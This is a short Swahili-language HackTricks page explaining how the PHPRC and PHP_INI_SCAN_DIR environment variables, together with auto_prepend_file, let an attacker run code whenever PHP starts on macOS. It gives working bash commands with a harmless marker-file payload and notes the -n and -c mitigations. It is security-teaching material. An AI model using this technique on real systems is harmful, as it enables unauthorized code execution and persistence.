# Injection ya PHP Applications kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` na `auto_prepend_file`

PHP CLI na CGI husoma usanidi katika kila invocation. `PHPRC` inaweza kuchagua `php.ini` inayoweza kusomeka na attacker, huku `PHP_INI_SCAN_DIR` inaweza kuelekeza upya directory inayochanganuliwa kwa faili za ziada za `.ini`. Directive ya `auto_prepend_file` hufanya PHP iparse faili kabla ya script iliyoombwa, kwa hivyo mchanganyiko huu huwa startup code execution.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Njia mbadala ni saraka iliyo na faili ya `.ini`:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
Chaguo la `-n` linapuuza `php.ini`; njia ya `-c` inayoaminika na iliyobainishwa huwa na kipaumbele kuliko `PHPRC`. Kumbuka kwamba server SAPI inayodumu kwa muda mrefu kwa kawaida husoma configuration wakati web server inapoanza, ilhali CLI na CGI hufanya hivyo kwa kila invocation.<sup>[[1]](#references)</sup>

## References

- [1] [Faili la configuration la PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [`auto_prepend_file` ya PHP](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
